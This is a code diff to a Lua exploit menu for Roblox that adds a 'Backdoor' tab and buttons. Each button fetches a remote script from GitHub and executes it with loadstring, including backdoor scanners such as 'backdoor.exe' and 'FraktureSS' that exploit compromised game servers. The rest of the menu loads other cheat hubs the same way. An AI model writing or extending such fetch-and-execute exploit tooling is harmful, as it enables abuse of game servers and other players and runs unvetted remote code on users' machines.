@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Egg Gui By Skeletonman#2000", "Ocean")
+local Window = Library.CreateLib("Egg Gui By Skeletonman#2000", "DarkTheme")
 
 local Main = Window:NewTab("Basic")
 local Section = Main:NewSection("Main")
@@ -231,6 +231,17 @@ Fly()
     
 end)
 
+local Backdoor = Window:NewTab("Backdoor")
+local BackdoorSection = Backdoor:NewSection("Backdoor")
+
+BackdoorSection:NewButton("Backdoor Executer (OP)", "Check backdoors and lets u use require scripts. aka backdoor.exe", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
+end)
+
+BackdoorSection:NewButton("Backdoor Executer 2 (OP)", "Check backdoors and lets u use require scripts. aka FraktureSS", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/unobfuscated.lua"))()
+end)
+
 local Scripts = Window:NewTab("Scripts")
 local ScriptsSection = Scripts:NewSection("scripts")
 
@@ -256,6 +267,14 @@ end)
 
 ScriptsSection:NewButton("Pendulum hub", "Epic script hub to use it in r15 just do reanimate", function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
+end)
+
+ScriptsSection:NewButton("BACKDOOR EXECUTER (OP)", "Epic script hub to use it in r15 just do reanimate", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
+end)
+
+ScriptsSection:NewButton("BACKDOOR EXECUTER 2 (OP)", "Epic script hub to use it in r15 just do reanimate", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
 end)
 
 ScriptsSection:NewButton("Ultimate Fling", "R15 R6 Best", function()
